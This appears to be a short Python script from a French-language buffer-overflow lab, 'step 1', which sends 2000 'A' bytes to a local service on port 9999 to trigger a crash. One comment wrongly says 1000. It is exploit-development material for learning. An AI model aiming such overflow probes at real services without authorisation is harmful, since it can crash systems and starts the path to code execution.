# Ceci est l'étape 1

import socket

# Informations de connexion
ip = "127.0.0.1"  # IP locale (loopback) car tu travailles localement
port = 9999      # Le port où l'application est en écoute <= Port à changer

# Charge utile : une longue chaîne de caractères "A" pour tester un buffer overflow
payload = b"A"*2000  # Envoie 1000 caractères "A" <= Taille à changer

# Création de la connexion socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Envoi de la charge utile
    print(f"Envoi de {len(payload)} octets au port {port}...")
    s.send(payload)

    # Ferme la connexion
    s.close()

    print("Charge envoyée avec succès.")
except Exception as e:
    print(f"Erreur lors de l'envoi de la charge : {e}")
